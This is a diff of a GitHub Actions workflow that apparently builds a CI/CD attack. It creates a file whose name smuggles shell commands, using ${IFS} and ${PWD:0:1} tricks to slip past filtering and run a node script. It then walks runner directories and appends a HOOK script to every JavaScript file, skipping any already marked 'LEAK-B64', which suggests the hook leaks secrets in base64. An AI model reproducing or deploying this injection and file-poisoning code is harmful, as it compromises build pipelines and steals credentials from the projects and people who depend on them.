@@ -14,7 +14,7 @@ jobs:
           printf 'forged report body' > content/body
           python3 - <<'PY'
           import os
-          name = "body;node${IFS}/tmp/content/content/p.js;#.txt"
+          name = "body;cd${IFS}${PWD:0:1}tmp${PWD:0:1}content${PWD:0:1}content;node${IFS}p.js;#.txt"
           assert len(name) < 255, len(name)
           open(os.path.join("content", name), "w").close()
           PY
@@ -37,7 +37,7 @@ jobs:
           const uniq = [...new Set(roots)];
           const seen = new Set();
           let patched = 0;
-          (function walk(d) {
+          function walk(d) {
             let ents = [];
             try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return; }
             for (const e of ents) {
@@ -54,26 +54,8 @@ jobs:
                 } catch (e) {}
               }
             }
-          })(uniq[0]);
-          for (const d of uniq.slice(1)) {
-            (function walk2(root) {
-              let ents = [];
-              try { ents = fs.readdirSync(root, { withFileTypes: true }); } catch (e) { return; }
-              for (const e of ents) {
-                const p = path.join(root, e.name);
-                if (e.isDirectory()) walk2(p);
-                else if (p.endsWith('.js') && !seen.has(p)) {
-                  seen.add(p);
-                  try {
-                    const cur = fs.readFileSync(p, 'utf8');
-                    if (cur.indexOf('LEAK-B64') !== -1) continue;
-                    fs.appendFileSync(p, '\n' + HOOK + '\n');
-                    patched++;
-                  } catch (e) {}
-                }
-              }
-            })(d);
           }
+          for (const d of uniq) walk(d);
           console.log('PATCHED ' + patched + ' roots=' + JSON.stringify(uniq) + ' ws=' + process.env.RUNNER_WORKSPACE);
           JSEOF
           cat > content/hook.js <<'JSEOF'
